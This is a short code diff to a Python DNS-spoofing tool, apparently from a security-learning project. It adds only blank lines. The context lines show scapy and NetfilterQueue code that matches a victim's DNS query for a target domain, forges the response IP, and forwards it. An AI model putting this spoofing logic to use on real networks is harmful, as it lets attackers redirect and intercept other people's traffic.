@@ -29,6 +29,7 @@ def forge_packet(packet):
     # Get the DNS Query name from the scapy packet.
     # Query name is the host name sent by the victim to the DNS server.
     qname = packet[scapy.DNSQR].qname
+
     # If the query name is our target domain,
     # modify the DNS sent IP address with IP address in arguments.
     if options.domain + "." == qname.decode():
@@ -50,6 +51,7 @@ def forge_packet(packet):
 def process_packet(packet):
     # Convert the NetfilterQueue packet into a scapy packet.
     scapy_packet = scapy.IP(packet.get_payload())
+
     # If the scapy packet has the DNS Resource Record(DNSRR),
     # and if it is intended for our target domain, modify the
     # packet, otherwise no changes will be made.
@@ -58,6 +60,7 @@ def process_packet(packet):
         # Set the forged scapy packet payload to the
         # NetfilterQueue packet.
         packet.set_payload(bytes(forged_packet))
+
     # Forward to the victim.
     packet.accept()
 
